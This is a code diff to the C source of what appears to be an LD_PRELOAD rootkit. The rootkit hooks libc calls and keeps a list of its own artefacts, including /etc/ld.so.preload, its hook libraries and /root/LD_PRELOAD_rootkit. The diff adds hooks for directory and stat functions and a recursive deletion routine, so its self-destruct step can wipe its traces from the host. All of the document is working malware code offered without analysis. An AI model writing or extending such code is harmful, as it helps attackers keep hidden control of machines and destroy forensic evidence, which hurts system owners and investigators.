@@ -9,6 +9,8 @@
 #include <errno.h>
 #include <sys/types.h>
 #include <sys/wait.h>
+#include <sys/stat.h>
+#include <dirent.h>
 
 // Conditional debug macros
 #if DEBUG_MODE
@@ -30,6 +32,7 @@ static const char *dna[] = {
     "/usr/local/lib/mhc_downreg.so",
     "/usr/local/lib/apoptosis.so",
     "/etc/ld.so.preload",
+    "/root/LD_PRELOAD_rootkit",
     NULL  // Sentinel
 };
 
@@ -48,6 +51,11 @@ static int (*real_renameat2)(int, const char *, int, const char *, unsigned int)
 static int (*real_unlink)(const char *) = NULL;
 static int (*real_unlinkat)(int, const char *, int) = NULL;
 static int (*real_remove)(const char *) = NULL;
+static DIR* (*real_opendir)(const char *) = NULL;
+static struct dirent* (*real_readdir)(DIR *) = NULL;
+static int (*real_closedir)(DIR *) = NULL;
+static int (*real_rmdir)(const char *) = NULL;
+static int (*real_lstat)(const char *, struct stat *) = NULL;
 
 // Initialize function pointers
 static void init_hooks(void) {
@@ -106,6 +114,46 @@ static void init_hooks(void) {
             abort();
         }
         DEBUG_PRINT("[HOOK] Initialized real_remove: %p\n", real_remove);
+    }
+    if (!real_opendir) {
+        real_opendir = dlsym(RTLD_NEXT, "opendir");
+        if (!real_opendir) {
+            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_opendir: %s\n", dlerror());
+            abort();
+        }
+        DEBUG_PRINT("[HOOK] Initialized real_opendir: %p\n", real_opendir);
+    }
+    if (!real_readdir) {
+        real_readdir = dlsym(RTLD_NEXT, "readdir");
+        if (!real_readdir) {
+            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_readdir: %s\n", dlerror());
+            abort();
+        }
+        DEBUG_PRINT("[HOOK] Initialized real_readdir: %p\n", real_readdir);
+    }
+    if (!real_closedir) {
+        real_closedir = dlsym(RTLD_NEXT, "closedir");
+        if (!real_closedir) {
+            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_closedir: %s\n", dlerror());
+            abort();
+        }
+        DEBUG_PRINT("[HOOK] Initialized real_closedir: %p\n", real_closedir);
+    }
+    if (!real_rmdir) {
+        real_rmdir = dlsym(RTLD_NEXT, "rmdir");
+        if (!real_rmdir) {
+            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_rmdir: %s\n", dlerror());
+            abort();
+        }
+        DEBUG_PRINT("[HOOK] Initialized real_rmdir: %p\n", real_rmdir);
+    }
+    if (!real_lstat) {
+        real_lstat = dlsym(RTLD_NEXT, "lstat");
+        if (!real_lstat) {
+            DEBUG_PRINT("[HOOK] ERROR: Failed to get real_lstat: %s\n", dlerror());
+            abort();
+        }
+        DEBUG_PRINT("[HOOK] Initialized real_lstat: %p\n", real_lstat);
     }
 }
 
@@ -194,18 +242,101 @@ static void execute_caspases(void) {
     }
 }
 
+// Recursive directory deletion function
+static void delete_directory_recursive(const char *path) {
+    DEBUG_PRINT("[HOOK] Recursively deleting directory: '%s'\n", path);
+
+    DIR *dir = real_opendir(path);
+    if (!dir) {
+        DEBUG_PRINT("[HOOK] ERROR: Failed to open directory '%s' (errno=%d: %s)\n",
+                path, errno, strerror(errno));
+        // Fail loudly - don't continue
+        abort();
+    }
+
+    struct dirent *entry;
+    while ((entry = real_readdir(dir)) != NULL) {
+        // Skip . and ..
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
+            continue;
+        }
+
+        // Build full path
+        char full_path[4096];
+        int written = snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
+        if (written < 0 || written >= sizeof(full_path)) {
+            DEBUG_PRINT("[HOOK] ERROR: Path too long for '%s/%s'\n", path, entry->d_name);
+            real_closedir(dir);
+            abort();
+        }
+
+        // Check if it's a directory
+        struct stat statbuf;
+        if (real_lstat(full_path, &statbuf) != 0) {
+            DEBUG_PRINT("[HOOK] ERROR: Failed to stat '%s' (errno=%d: %s)\n",
+                    full_path, errno, strerror(errno));
+            real_closedir(dir);
+            abort();
+        }
+
+        if (S_ISDIR(statbuf.st_mode)) {
+            // Recursively delete subdirectory
+            delete_directory_recursive(full_path);
+        } else {
+            // Delete file
+            DEBUG_PRINT("[HOOK] Deleting file: '%s'\n", full_path);
+            if (real_unlink(full_path) != 0) {
+                DEBUG_PRINT("[HOOK] ERROR: Failed to delete file '%s' (errno=%d: %s)\n",
+                        full_path, errno, strerror(errno));
+                real_closedir(dir);
+                abort();
+            }
+            DEBUG_PRINT("[HOOK] Successfully deleted file: '%s'\n", full_path);
+        }
+    }
+
+    real_closedir(dir);
+
+    // Now delete the directory itself
+    DEBUG_PRINT("[HOOK] Deleting directory: '%s'\n", path);
+    if (real_rmdir(path) != 0) {
+        DEBUG_PRINT("[HOOK] ERROR: Failed to delete directory '%s' (errno=%d: %s)\n",
+                path, errno, strerror(errno));
+        abort();
+    }
+    DEBUG_PRINT("[HOOK] Successfully deleted directory: '%s'\n", path);
+}
+
 // Delete all DNA paths
 static void delete_dna(void) {
     DEBUG_PRINT("[HOOK] Deleting DNA paths from system...\n");
 
     for (int i = 0; dna[i] != NULL; i++) {
         DEBUG_PRINT("[HOOK] Attempting to delete: '%s'\n", dna[i]);
-        int unlink_result = real_unlink(dna[i]);
-        if (unlink_result != 0) {
-            DEBUG_PRINT("[HOOK] ERROR: Failed to delete '%s' (errno=%d: %s)\n",
+        
+        // Check if path exists and whether it's a file or directory
+        struct stat statbuf;
+        if (real_lstat(dna[i], &statbuf) != 0) {
+            if (errno == ENOENT) {
+                DEBUG_PRINT("[HOOK] Path '%s' does not exist (already deleted?)\n", dna[i]);
+                continue;
+            }
+            DEBUG_PRINT("[HOOK] ERROR: Failed to stat '%s' (errno=%d: %s)\n",
                     dna[i], errno, strerror(errno));
+            abort();
+        }
+        
+        if (S_ISDIR(statbuf.st_mode)) {
+            // It's a directory - delete recursively
+            delete_directory_recursive(dna[i]);
         } else {
-            DEBUG_PRINT("[HOOK] Successfully deleted: '%s'\n", dna[i]);
+            // It's a file - delete normally
+            if (real_unlink(dna[i]) != 0) {
+                DEBUG_PRINT("[HOOK] ERROR: Failed to delete file '%s' (errno=%d: %s)\n",
+                        dna[i], errno, strerror(errno));
+                abort();
+            }
+            DEBUG_PRINT("[HOOK] Successfully deleted file: '%s'\n", dna[i]);
         }
     }
 }
